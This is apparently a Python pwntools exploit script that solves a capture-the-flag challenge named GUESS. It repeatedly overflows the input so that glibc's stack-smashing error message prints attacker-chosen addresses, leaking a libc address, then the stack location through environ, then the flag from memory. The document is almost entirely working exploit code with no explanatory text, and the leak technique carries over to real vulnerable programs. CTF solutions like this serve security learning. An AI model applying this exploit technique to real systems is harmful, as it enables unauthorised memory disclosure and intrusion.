
from pwn import *
context.terminal = ['tmux','sp','-h','-l','105']
context.log_level = 'debug'
r = lambda x:p.recv(x)
rl = lambda:p.recvline
ru = lambda x:p.recvuntil(x)
rud = lambda x:p.recvuntil(x,drop=True)
s = lambda x:p.send(x)
sl = lambda x:p.sendline(x)
sla = lambda x,y:p.sendlineafter(x,y)
rn = lambda x:p.recvn(x)
def hint():
  print 'pidof is %s ' % pidof(p)
  raw_input('waiting for debug')
def makep(ip='',port=0,binary=''):
    global p
    if ip and port:
        p = remote(ip,port)
    else:
        p = process(binary)

makep(binary='./GUESS')
libc = ELF('./libc.so.6')
ru('Please type your guessing flag\n')
sl(p64(0x602020)*0x100)
ru('*** stack smashing detected ***: ')
libc.address = u64(rn(6).ljust(0x8,'\x00'))-libc.symbols['puts']
environ = libc.symbols['environ']
log.success('environ:'+hex(environ))
ru('Please type your guessing flag\n')
sl(p64(environ)*0x100)
ru('*** stack smashing detected ***: ')
stack = u64(rn(6).ljust(0x8,'\x00'))
log.success('stack:'+hex(stack))   
ru('Please type your guessing flag\n')
sl(p64(stack-0x168)*0x100)
ru('*** stack smashing detected ***: ')
p.interactive()
